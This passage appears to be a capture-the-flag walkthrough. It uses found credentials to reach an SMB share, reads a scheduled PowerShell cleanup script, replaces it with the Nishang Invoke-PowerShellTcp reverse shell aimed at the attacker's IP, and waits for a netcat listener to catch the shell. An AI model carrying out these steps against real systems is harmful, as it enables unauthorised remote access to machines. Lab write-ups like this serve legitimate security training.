- Connect with `smbclient` with the credentials you got.


```
smbclient //<MACHINE IP>/Enterprise-Share -U 'enterprise-security'
smb: \> dir
```

![[Screenshot_2025-10-04_13-45-23.png]]

- Display the `PurgeIrrelevantData_1826.ps1` content .
```
smb: \> more PurgeIrrelevantData_1826.ps1
```

![[Screenshot_2025-10-04_13-50-51 1.png]]

Effect: it will **silently delete everything inside** `C:\Users\Public\Documents\` but **not the folder itself**.

## Reverse Shell

#Attacking_Machine 
- You need a reverse shell like `Invoke-PowerShellTcp.ps1` to get a shell on your attacking machine. You can download it from [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
- After download it, rename it as `PurgeIrrelevantData_1826.ps1`.
- Add the following line at the bottom of the file.
```
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKING MACHIINE IP> -Port 443
```

#SMB_shell
- Put it to the victim machine.

```
smb: \> put PurgeIrrelevantData_1826.ps1 
```

#Attacking_Machine 
- Open a netcat listener on port 443.

```
nc -lnvp 443
```

As the `PurgeIrrelevantData_1826.ps1` supposedly is run as a cron task, you'll have to wait for the target system to execute the script.

![[Screenshot_2025-10-04_14-36-22.png]]


